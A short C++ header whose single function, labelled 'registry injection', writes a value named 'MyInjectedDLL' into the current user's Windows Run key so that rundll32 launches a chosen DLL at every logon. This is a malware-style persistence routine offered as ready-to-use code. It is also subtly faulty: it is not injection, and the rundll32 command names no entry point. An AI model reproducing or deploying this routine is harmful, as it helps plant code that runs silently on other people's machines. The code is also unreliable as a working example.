#pragma once

#include <Windows.h>
#include <tchar.h>
#include <vector>
#include <TlHelp32.h>
#include <winternl.h>
#include <iostream>


namespace RegistryInjection {
    bool inject_dll_by_registry(const char* dll_path) {
        HKEY registry_key;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &registry_key) != ERROR_SUCCESS) {
            std::cout << "FAIL_OPEN_REGISTRY_KEY" << std::endl;
            return false;
        }

        std::string value_name = "MyInjectedDLL";
        std::string command = "rundll32.exe " + std::string(dll_path);

        if (RegSetValueExA(registry_key, value_name.c_str(), 0, REG_SZ, reinterpret_cast<const BYTE*>(command.c_str()), static_cast<DWORD>(command.length() + 1)) != ERROR_SUCCESS) {
            std::cout << "FAIL_SET_REGISTRY_VALUE" << std::endl;
            RegCloseKey(registry_key);
            return false;
        }

        RegCloseKey(registry_key);
        return true;
    }
}